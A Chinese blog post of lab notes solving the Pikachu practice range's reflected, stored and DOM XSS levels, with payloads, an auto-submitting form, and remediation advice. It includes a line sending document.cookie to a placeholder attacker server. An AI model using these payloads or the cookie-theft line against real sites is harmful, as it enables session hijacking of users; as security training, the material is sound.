---
title: 网络渗透测试作业：Pikachu 靶场（五）XSS 的三种类型
date: 2026-11-26 15:30:00
categories:
  - 学习笔记
tags:
  - 网络安全
  - 网络渗透测试
  - XSS
---

暴力破解那四关做完，工具链算是热了：代理、抓包、改包、脚本。转到 XSS 之后我第一件事还是照着旧套路来，抓包、改参数、发。

结果第一次就撞墙：payload 粘进去只剩一半。

那次失败挺有价值，因为它让我意识到 XSS 和爆破不是同一类问题。爆破是「猜一个我不想知道的答案」，XSS 是「塞一段内容，看服务器会不会原样吐出来、浏览器会不会把它当代码」。判断标准也变了，不再是「登录成功」，而是有没有弹窗。

这一篇按反射型（get / post）、存储型、DOM 型四关的顺序记，实验还是在自己的虚拟机内网里完成。

<!-- more -->

## 一、先把三种类型分清

XSS 分反射型、存储型、DOM 型，定义背下来也容易混。我的理解是，三者唯一的差别，是 payload 从你手里到被执行，中间经过了谁。

```text
反射型：我 → 服务器（原样吐回） → 我的浏览器执行
存储型：我 → 服务器（存进数据库） → 任何人的浏览器执行
DOM 型：我 → 浏览器自己的 JS（服务器全程不知道）→ 我的浏览器执行
```

记住这条链路，做题的时候就知道该往哪塞、该拿什么当证据。

## 二、反射型（get）：第一次就被截断

进 `xss_reflected_get.php`，输 `hello` 点 submit，页面把 `hello` 显示出来，地址栏也变了：

```text
http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=hello&submit=submit
```

`message` 是变量名，输入跟在 URL 里，所以叫 get。

然后我把 `<script>alert(1)</script>` 粘进去，页面上只出现了一截：

```text
<script>alert(1)</sc
```

数一下：`<script>` 8 个字符，`alert(1)` 8 个，`</sc` 4 个，正好 20。输入框设了 `maxlength="20"`，完整 payload 是 25 个字符，尾巴被砍掉 5 个，`</script>` 变成 `</sc`，标签没闭合，浏览器只能当文字显示。

![输入框只装得下 20 个字符，`</script>` 被切成了 `</sc`](/img/pikachu-05-maxlength.png)

解决方式有两种，我两种都试了。

改 DOM：F12 → 查看器 → 搜 `maxlength` → 双击那个 `20` 改成 `200` → 回车。改完不能刷新页面，一刷新 DOM 就还原了。

直接改 URL：get 的 payload 本来就在地址栏，绕开表单就行。把整段做 URL 编码：

```text
http://localhost/pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&submit=submit
```

`%3C` 是 `<`，`%3E` 是 `>`，`%2F` 是 `/`。回车，弹窗出来了。

![地址栏里是编码后的 payload，页面上弹出 1](/img/pikachu-05-reflected-get.png)

这里有个细节：地址栏会显示成 `message=<script>alert(1)</%2Fscript>`，只有 `%2F` 没被还原。因为斜杠在 URL 里是路径分隔符，浏览器不敢解码。服务端收到的仍然是完整的 `</script>`，弹窗就是证据。

这一步真正验证的东西：服务器把你的输入原样拼进了 HTML，一个字符都没转义。对应的服务端代码大概就是一句 `echo $_GET['message'];`。

`maxlength` 这个坑顺带说明一件事：前端限制不是防护。它是给正常用户设的输入提示，攻击者按个 F12 就没了。这和前几天做的客户端验证码是同一个道理，客户端的一切都不可信。

## 三、反射型（post）：URL 变干净了，但没更安全

第二关 `xss_reflected_post.php`，进去先要求登录。账号密码沿用暴力破解那套 `admin / 123456`，用的就是同一张 `users` 表。

登录之后页面才给输入框。粘 `<script>alert(1)</script>`，点提交，弹窗。

和 get 最直观的区别是地址栏全程没变，还是那个干净的地址。payload 藏在请求体的 form data 里，网络面板里那条请求就是 `xss_reflected_post.php`。

![POST 提交后弹窗，地址栏看不出任何东西](/img/pikachu-05-post.png)

这一关的输入框没有长度限制，25 个字符完整进去了。同一套靶场里，同类漏洞的防护强度参差不齐，长度限制是每个页面各写各的。

那 post 是不是比 get 安全？不是。它只是把「发一条链接就能打」变成了「需要一个自动提交的页面」：

```html
<form action="http://靶场/vul/xss/xss_reflected_post.php" method="post">
  <input name="message" value="<script>alert(1)</script>">
</form>
<script>document.forms[0].submit()</script>
```

受害者打开这个页面，表单自动提交，payload 就送进去了。门槛抬高了一点点，性质没变。

## 四、存储型：弹了两次，库里有两条

第三关是个留言板，输入会真的写进数据库。

我提交的是 `<script>alert(2)</script>`，页面一刷新就弹了。点确定，紧接着又弹一个，这次是 1。

![第一个框是 2](/img/pikachu-05-stored-2.png)

![第二个框是 1](/img/pikachu-05-stored-1.png)

我一开始以为是自己手快点了两次提交，后来去数据库里查 `message` 表才明白：

```text
+----+---------------------------+
| id | content                   |
+----+---------------------------+
| 60 | <script>alert(2)</script> |
| 59 | <script>alert(1)</script> |
+----+---------------------------+
```

库里有两条，一条 `alert(1)`，一条 `alert(2)`，前一条是我早先试的时候留下的。留言列表按时间倒序渲染，新的在前，所以先弹 2 再弹 1。页面渲染列表时，每段内容都原样插进 HTML，有几段 `<script>` 就执行几次，`alert()` 又是阻塞的，表现就是「关掉一个，紧接着再弹一个」。

这一关的核心验证其实不是弹窗，是刷新页面之后还弹。关掉浏览器、重进、换台机器访问，一样弹，因为 payload 已经在数据库里了，跟你这次访问没关系。

存储型和反射型的差距就在这里：

|  | 反射型 | 存储型 |
|---|---|---|
| payload 存在哪 | 只在这一次响应里 | 数据库 |
| 谁中招 | 点链接的那个人 | 所有打开这个页面的人 |
| 攻击者要不要做事 | 要发链接骗点击 | 投毒一次就够 |
| 持续时间 | 关掉页面就没了 | 一直在，直到被删 |

最后一行是重点。反射型是一次性的，存储型是可持续的，危害高一个量级。

## 五、DOM 型：payload 根本不经过服务器

第四关 `xss_dom.php`，前三种套路全部失效。

先输一个 `hello`，点 click me!，页面下方 "what do you see?" 变成蓝色链接。右键检查元素，看到：

```html
<a href="hello">what do you see?</a>
```

![输入跑进了 href 里](/img/pikachu-05-dom-source.png)

按 Ctrl+U 看源码，找到那段函数：

```javascript
function domxss(){
  var str = document.getElementById("text").value;
  document.getElementById("dom").innerHTML = "<a href='"+str+"'>what do you see?</a>";
}
```

两行代码，信息很全：从输入框取值，拼进 `<a>` 标签的 `href`，然后用 `innerHTML` 写回页面。

这段逻辑全在浏览器里跑，服务器一行都没参与。所以这一关和其他三关性质不一样，payload 从来没被发到服务端。

### payload 的形状是被代码决定的

拼接结果是 `<a href='【我的输入】'>`，注意 `href='` 用的是单引号，而整个 JS 字符串用的是双引号。这两层引号直接限制了 payload 能写什么：

- 不能用双引号，会提前结束 JS 字符串，整段脚本语法错误
- 不能直接写 `<script>`，一是它落在 `href='...'` 属性值里，浏览器当普通字符；二是 `innerHTML` 插入的 `<script>` 标签按 HTML5 规范不会执行

所以这关只能用事件属性型 payload。我试了两个，都能弹：

```text
'><img src=# onerror=alert(1)>
```

![点完 click me! 就自己弹了](/img/pikachu-05-dom-onerror.png)

```text
' onclick='alert(1)
```

![这个要点一下那行链接才弹](/img/pikachu-05-dom-onclick.png)

### 两个 payload 差在哪

第一个是点完 click me! 就自己弹出来的。`innerHTML` 一写进去，浏览器就去请求那个图片地址，地址不存在，加载失败，`onerror` 立刻执行，我什么都没多做。

第二个拼出来的是一行链接：

```html
<a href="" onclick="alert(1)">what do you see?</a>
```

`click me!` 只是把这行链接生成出来，弹窗不会自己冒出来，还得再点一下 "what do you see?"。

| payload | 触发方式 |
|---|---|
| `'><img src=# onerror=alert(1)>` | 自动，图片加载失败就执行 |
| `' onclick='alert(1)` | 要用户点一下那个链接 |

这个差别在实际攻击里挺关键：`onerror` 型是打开就中招，`onclick` 型要骗人点一下，但链接看起来完全正常，反而更隐蔽。

第一个 payload 拼进页面之后大概长这样：

```html
<a href=""><img src="#" onerror="alert(1)">'>what do you see?</a>
```

`href` 被第一个单引号提前闭合，`<img>` 成了 `<a>` 的子元素，多出来的 `'>` 变成页面上的一截文字，不影响攻击，只是看着脏。

## 六、四关对比

| 关卡 | payload | 判断依据 | 特点 |
|---|---|---|---|
| 反射型 get | `<script>alert(1)</script>` | 弹窗 | payload 在 URL，发链接就能打；有 20 字符限制 |
| 反射型 post | `<script>alert(1)</script>` | 弹窗 | payload 在请求体，要诱导提交表单；无长度限制 |
| 存储型 | `<script>alert(1)</script>` | 弹窗 ×N | 入库，所有访客中招，刷新仍在 |
| DOM 型 | `' onclick='alert(1)` 或 `'><img src=# onerror=alert(1)>` | 点链接 / 自动弹窗 | 只在浏览器里拼 DOM，不进服务器，必须读源码 |

前三关 payload 长得一样，第四关必须换形状，原因就一句话：`innerHTML` 插入的 `<script>` 不执行。

还有一个共同点容易被忽略：`alert(1)` 只是证明代码执行了，本身没有危害。真实利用会换成窃取凭证的代码，比如：

```javascript
new Image().src = 'http://攻击者服务器/?c=' + document.cookie;
```

如果 cookie 里带 `PHPSESSID` 且没有 `HttpOnly`，攻击者拿到这个值就能直接冒充登录，连密码都不需要。

## 七、修复思路

四关的修复方式不完全一样，但核心是同一条原则：输出的时候，要知道这段内容要放进哪里。

1. **HTML 正文输出**：做 HTML 实体编码，`<` 转成 `&lt;`，`>` 转成 `&gt;`。这是最基础的一层。
2. **属性内部输出**：除了实体编码，属性值必须用引号包裹，还要防止引号被闭合。
3. **URL / JS 上下文输出**：不能用 HTML 编码了事，要用对应上下文专门的转义（URL 编码、JSON 序列化）。
4. **富文本场景**：别自己写正则过滤，用成熟的 HTML 清洗库（如 DOMPurify），白名单放行标签。
5. **DOM 型**：前端不要用 `innerHTML` / `document.write` 拼接用户数据，改用 `textContent` 或用 `document.createElement` 按结构生成。
6. **兜底**：给会话 cookie 加 `HttpOnly`，这样即使有 XSS 也偷不到 cookie；再配 CSP 限制内联脚本执行。

第 6 条值得单独说一句：它不能阻止 XSS 发生，但能大幅降低危害。XSS 很难彻底杜绝，所以要留一道「就算被打了也不至于丢凭证」的防线。

## 八、小结

这一轮做下来，最大的收获不是记住了四个 payload，而是搞清楚了一件事：判断 payload 该长什么样，靠的是读代码，不是背模板。

反射型和存储型的 payload 是 `<script>`，因为那是服务端把 HTML 拼好、浏览器首次解析整页。DOM 型的 payload 必须换成事件属性，因为它走的是 `innerHTML`，规矩不一样。

不看代码就乱试，试一百次也试不出来。

下一篇打算做 CSRF，那关的思路上又要换一次：不塞代码了，改成让浏览器「自愿」替攻击者发请求。
